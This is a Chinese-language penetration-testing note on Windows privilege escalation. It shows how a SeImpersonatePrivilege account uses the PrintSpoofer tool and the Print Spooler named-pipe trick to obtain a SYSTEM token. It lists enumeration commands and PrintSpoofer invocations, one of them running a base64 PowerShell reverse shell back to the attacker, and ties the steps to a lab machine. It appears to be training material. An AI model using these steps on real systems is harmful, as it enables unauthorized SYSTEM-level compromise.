# 💥 SeImpersonatePrivilege 與 PrintSpoofer 提權 (seimpersonateprivilege)

本文件說明 Windows/Active Directory 環境中擁有 `SeImpersonatePrivilege` (身份模擬特權) 時，配合 `Print Spooler` 服務運行狀態，使用 `PrintSpoofer` 工具進行本地特權提升至 `SYSTEM` 的手法與利用技巧。

---

## 🔍 漏洞成因與原理

`SeImpersonatePrivilege`（身分模擬特權）通常授予系統服務、IIS 應用程式集區或某些特定的域用戶帳號。該特權允許程序代表其他用戶或服務帳戶執行安全操作（即身分模擬）。

若攻擊者控制了具備該特權的帳戶，且目標系統上運作著一個以高權限（如 `nt authority\system`）運行的服務（例如 Windows 預設啟用的 `Print Spooler` 列印多工緩衝服務），即可進行 Token 複製與提權：
1. **建立具名管道**：攻擊者在本地建立一個自定義的具名管道 (Named Pipe)。
2. **誘發高權限服務驗證**：利用 `Print Spooler` 服務的行為，觸發該服務連線至攻擊者控制的管道。
3. **複製 Token 提權**：當 Spooler 服務（以 SYSTEM 權限）連線至管道時，管道伺服器可模擬該連線客戶端，進而複製其 SYSTEM 安全令牌 (Impersonation Token)。
4. **啟動新程序**：使用複製的 SYSTEM 令牌呼叫 `CreateProcessWithTokenW` 或 `CreateProcessAsUser` 啟動任意指令，從而成功提權至最高 SYSTEM 權限。

在較新的 Windows 系統（如 Windows Server 2016 / 2019 / Windows 10 等）中，`PrintSpoofer` 相比傳統的 `Juicy Potato` 更加實用，因為它不需要與 COM/RPC 通訊（後續系統已防堵 COM 模擬），而是直接利用本地具名管道進行攻擊。

---

## 🛠️ 常見利用與繞過技巧

### 1. 漏洞檢測 / 資訊收集
在取得初始 Shell 後，檢查是否具有該權限，並確認 Print Spooler 服務是否正常運行：
```powershell
# 1. 檢查目前使用者特權
whoami /priv
# 輸出中需包含：SeImpersonatePrivilege - Impersonate a client after authentication - Enabled

# 2. 檢查 Print Spooler 服務狀態
Get-Service spooler
# 輸出狀態需為 Running
```

### 2. 基本利用方法
下載 [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) 工具並上傳至目標系統。

*   **互動模式下直接取得 SYSTEM Shell**：
    若在互動式 shell 下（如惡意 winrm），可直接生成一個 SYSTEM 權限的 cmd 視窗：
    ```powershell
    .\PrintSpoofer64.exe -i -c cmd.exe
    ```
*   **執行反彈 Shell 指令**：
    若為非互動式 shell 或需要直接將 SYSTEM shell 反彈回攻擊機，可指定執行 PowerShell Base64 指令：
    ```powershell
    # 執行 PowerShell 反彈 Shell 指令
    .\PrintSpoofer64.exe -c "powershell -e <BASE64_ENCODED_REVERSE_SHELL>"
    ```

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Poseidon]]（使用 WinRM 登入 `GYOZA` 主機後，發現普通帳戶 `Eric.Wallows` 擁有 `SeImpersonatePrivilege` 權限。確認 spooler 服務為 Running 狀態後，上傳並執行 `PrintSpoofer64.exe` 配合 PowerShell 反彈 Shell，成功在 Kali 攻擊機端接回 `nt authority\system` 權限的 Shell）。
